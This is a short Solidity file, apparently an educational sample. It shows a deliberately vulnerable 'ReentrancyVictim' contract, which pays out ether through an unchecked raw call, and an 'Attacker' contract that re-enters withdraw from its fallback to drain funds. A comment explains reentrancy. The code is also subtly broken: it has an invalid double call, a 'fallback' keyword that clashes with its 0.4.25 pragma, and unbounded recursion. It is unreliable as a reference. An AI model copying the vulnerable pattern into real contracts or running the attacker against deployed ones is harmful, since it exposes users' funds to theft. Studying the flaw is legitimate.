// SPDX-License-Identifier: MIT
pragma solidity ^0.4.25;

contract ReentrancyVictim {
    function withdraw() public {
        uint transferAmt = 1 ether; 
        if (!msg.sender.call.value(transferAmt)()) revert();
    }
    
    function deposit() public payable {}
}

contract Attacker {
    ReentrancyVictim v;

    constructor(address victim) {
        v = ReentrancyVictim(victim);
    }

    function attack() public{
        v.withdraw()();
    }

    fallback () external payable {
        v.withdraw();
    }
}

//A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the
//untrusted contract make a recursive call back to the original function in an attempt to drain funds.
